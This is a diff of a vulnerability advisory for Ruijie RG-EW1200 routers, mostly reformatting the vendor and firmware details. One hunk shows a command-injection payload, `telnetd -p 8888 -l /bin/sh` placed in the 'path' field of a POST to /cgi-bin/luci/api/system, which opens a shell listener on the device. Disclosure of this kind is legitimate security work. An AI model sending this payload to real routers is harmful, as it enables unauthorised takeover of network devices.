@@ -2,15 +2,15 @@
 
 **Vendor of the products:**    Ruijie Networks
 
-**Vendor's website:**    [https://www.ruijienetworks.com](https://www.ruijienetworks.com")
+**Vendor's website:**    [https://www.ruijienetworks.com](https://www.ruijienetworks.com "https://www.ruijienetworks.com")
 
 **Reported by:**    WangJincheng(<wjcwinmt@outlook.com>) & ShaLetian(<ltsha@njupt.edu.cn>)
 
-**Affected products:**	RG-EW1200 Wireless Routers
+**Affected products:**    RG-EW1200 Wireless Routers
 
-**Affected firmware version:**	EW_3.0(1)B11P204 (the latest release version, 2023.1.18)
+**Affected firmware version:**    EW_3.0(1)B11P204 (the latest release version, 2023.1.18)
 
-**Firmware download address:** 	[https://www.ruijienetworks.com/support/documents/slide_77459](https://www.ruijienetworks.com/support/documents/slide_77459 "https://www.ruijienetworks.com/support/documents/slide_77459")
+**Firmware download address:**    [https://www.ruijienetworks.com/support/documents/slide_77459](https://www.ruijienetworks.com/support/documents/slide_77459 "https://www.ruijienetworks.com/support/documents/slide_77459")
 
 # Overview
 
@@ -52,7 +52,7 @@ Send the following as a `POST` request to the URL `/cgi-bin/luci/api/system`.
         "params": {
             "isPersist": "aaaa"
             "path": "`telnetd -p 8888 -l /bin/sh`"
-         }
+        }
 }
 ```
 
